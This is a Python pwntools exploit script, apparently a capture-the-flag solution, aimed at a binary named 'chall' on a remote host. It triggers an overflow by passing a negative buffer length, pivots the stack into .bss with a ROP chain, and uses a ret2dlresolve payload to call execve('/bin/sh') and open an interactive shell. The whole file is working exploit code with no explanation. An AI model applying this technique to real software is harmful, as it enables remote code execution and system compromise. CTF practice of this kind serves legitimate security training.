#!/usr/bin/env python3
from pwn import *

PORT = 8999
HOST = "15.235.202.47"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x00000000004012C7
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

pop_rdi = 0x40117a
pop_rsi = 0x40117c
pop_rdx = 0x40117e
leave_ret = 0x40132b
ret = 0x40117b
bss = elf.bss() + 0x800

read_plt = elf.plt.read

p.sendlineafter(b"Let me know the length of your buffer:", b"-1")

# Stage 1:

pl1 = flat(
    b'A'*0x50,
    0, 0xdeadbeefcafebabe,
    b'B'*0x40,
    bss,        # saved_rbp
    pop_rdi, 0, # saved_rip
    pop_rsi, bss,
    pop_rdx, 0x500,
    read_plt,
    leave_ret
    )
pl1 = pl1.ljust(255, b'\x00')

p.send(pl1)

# Stage 2:

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol = "execve",
    args = ["/bin/sh", 0, 0],
    data_addr = bss + 0x200
    )


rop = ROP(elf)
rop.ret2dlresolve(dlresolve)

pl2 = flat(
        {
            0x00: bss,
            0x08: rop.chain(),
            0x200: dlresolve.payload,
        },
        filler = b'\x00'
    )

p.send(pl2)


p.interactive()